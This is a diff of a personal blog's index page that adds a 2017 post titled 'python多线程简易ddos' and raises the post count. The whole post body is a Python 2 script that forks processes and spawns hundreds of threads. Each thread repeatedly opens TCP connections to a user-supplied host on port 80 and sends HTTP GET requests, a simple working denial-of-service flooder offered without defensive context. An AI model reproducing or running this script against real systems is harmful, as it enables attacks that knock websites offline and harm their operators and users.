@@ -317,6 +317,184 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/python-ddos/index.html">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Imagemlt">
+      <meta itemprop="description" content="personal blog">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Image's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/post/python-ddos/index.html" itemprop="url">
+                  python多线程简易ddos
+                </a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2017-01-27 13:24:05" itemprop="dateCreated datePublished" datetime="2017-01-27T13:24:05+08:00">2017-01-27</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/" itemprop="url" rel="index"><span itemprop="name">人生杂谈</span></a></span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/人生杂谈/技术学习/" itemprop="url" rel="index"><span itemprop="name">技术学习</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#! /usr/bin/env python</p>
+<p>#coding=utf-8<br>import threading<br>from time import ctime,sleep<br>from socket import *<br>import os<br>def ddos(HOST):<br>    PORT=80<br>    ADDR=(HOST,PORT)<br>    while True:<br>        try:<br>            tcpsock=socket(AF_INET,SOCK_STREAM)<br>            tcpsock.connect(ADDR)<br>            tcpsock.send(“GET / HTTP/1.1\r\n”)<br>            tcpsock.send(“HOST:localhost\r\n\n”)<br>            print “one attack”<br>            tcpsock.close()<br>        except Exception,e:<br>            print “error ocurred”<br>try:<br>    host=raw_input(“please enter the destination:”)<br>    threads=[]<br>    for m in xrange(0,10):<br>        os.fork()<br>    for i in xrange(0,100):<br>        ti=threading.Thread(target=ddos,args=(host,))<br>        threads.append(ti)<br>    if __name__==’__main__‘:<br>        for t in threads:<br>            t.setDaemon(True)<br>            t.start()<br>        t.join()<br>except Exception,e:<br>    print “error occured”</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/idf-three-ways/index.html">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -2005,7 +2183,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">49</span>
+                    <span class="site-state-item-count">50</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
